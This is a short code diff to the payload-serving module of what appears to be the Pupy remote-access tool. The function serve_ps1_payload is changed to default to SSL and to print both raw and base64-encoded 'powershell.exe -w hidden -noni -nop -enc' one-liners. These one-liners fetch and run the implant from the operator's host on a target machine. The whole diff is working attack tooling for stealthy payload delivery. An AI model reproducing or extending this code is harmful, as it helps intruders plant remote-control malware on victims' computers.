@@ -135,7 +135,7 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
             certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
             self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)
 
-def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=False, useTargetProxy=True):
+def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=True, useTargetProxy=True):
     try:
         try:
             server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
@@ -164,6 +164,8 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Fa
                 b=b64encode(a.encode('UTF-16LE'))
             oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
+        print colorize("powershell.exe -w hidden -noni -nop -enc %s"%a, "green")
+        print " --- "
         print oneliner
         print " --- "
         print message
